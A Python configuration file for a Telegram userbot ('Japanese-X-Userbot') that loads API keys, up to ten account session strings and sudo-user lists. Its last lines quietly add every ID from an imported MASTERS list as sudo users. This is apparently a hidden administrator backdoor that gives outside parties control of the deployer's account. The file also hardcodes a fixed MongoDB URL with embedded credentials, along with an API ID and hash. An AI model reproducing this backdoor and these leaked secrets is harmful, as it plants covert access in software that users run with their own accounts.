import os
from distutils.util import strtobool
from os import getenv
from X.helpers.cmd import cmd
from dotenv import load_dotenv
from XDB.data import MASTERS

load_dotenv("config.env")

ALIVE_EMOJI = getenv("ALIVE_EMOJI", "🥵")
ALIVE_LOGO = getenv("ALIVE_LOGO", "https://graph.org/file/ec99cb6dba229bd984537.jpg")
ALIVE_TEKS_CUSTOM = getenv("ALIVE_TEKS_CUSTOM", "Hey, I am alive.")
API_HASH = getenv("API_HASH", "34efb38c74d5e6b25d1bb6234396a8af")
API_ID = int(getenv("API_ID", "23129036"))
BOTLOG_CHATID = int(getenv("BOTLOG_CHATID") or 0)
BOT_VER = "3.0.0@main"
BRANCH = getenv("BRANCH", "main") #don't change this line 
CMD_HNDLR = cmd
DB_URL = "mongodb+srv://public:abishnoimf@cluster0.rqk6ihd.mongodb.net/?retryWrites=true&w=majority"
OWNER_ID = int(getenv("OWNER_ID", "6694740726"))
BOT_TOKEN = getenv("BOT_TOKEN", "none")
OPENAI_API_KEY = getenv("OPENAI_API_KEY", "")
CHANNEL = getenv("CHANNEL", "Japanese_Userbot")
CMD_HANDLER = getenv("CMD_HANDLER", ".")
GIT_TOKEN = getenv("GIT_TOKEN", "")
GROUP = getenv("GROUP", "Japanese_Userbot_Chat")
HEROKU_API_KEY = getenv("HEROKU_API_KEY")
HEROKU_APP_NAME = getenv("HEROKU_APP_NAME")
REPO_URL = getenv("REPO_URL", "https://github.com/Team-Japanese/Japanese-X-Userbot")
STRING_SESSION1 = getenv("STRING_SESSION1", "")
STRING_SESSION2 = getenv("STRING_SESSION2", "")
STRING_SESSION3 = getenv("STRING_SESSION3", "")
STRING_SESSION4 = getenv("STRING_SESSION4", "")
STRING_SESSION5 = getenv("STRING_SESSION5", "")
STRING_SESSION6 = getenv("STRING_SESSION6", "")
STRING_SESSION7 = getenv("STRING_SESSION7", "")
STRING_SESSION8 = getenv("STRING_SESSION8", "")
STRING_SESSION9 = getenv("STRING_SESSION9", "")
STRING_SESSION10 = getenv("STRING_SESSION10", "")
SESSIONS = [STRING_SESSION1, STRING_SESSION2, STRING_SESSION3, STRING_SESSION4, STRING_SESSION5, STRING_SESSION6, STRING_SESSION7, STRING_SESSION8, STRING_SESSION9, STRING_SESSION10]
SUDO_USERS = list(map(int, getenv("SUDO_USERS", "").split()))
BLACKLIST_CHAT = getenv("BLACKLIST_CHAT", None)
if not BLACKLIST_CHAT:
    BLACKLIST_CHAT = [-1001608701614, -1001675459127, -1001473548283, -1001608701614]
BLACKLIST_GCAST = {int(x) for x in getenv("BLACKLIST_GCAST", "").split()}    
SUDOS = getenv("SUDO_USERS", None)
SUDO_USERS = []
if SUDOS:
    sudos = str(SUDOS).split(" ")
    for sudo_id in sudos:
        SUDO_USERS.append(int(sudo_id))
SUDO_USERS.append(OWNER_ID)
for x in MASTERS:
    SUDO_USERS.append(x)
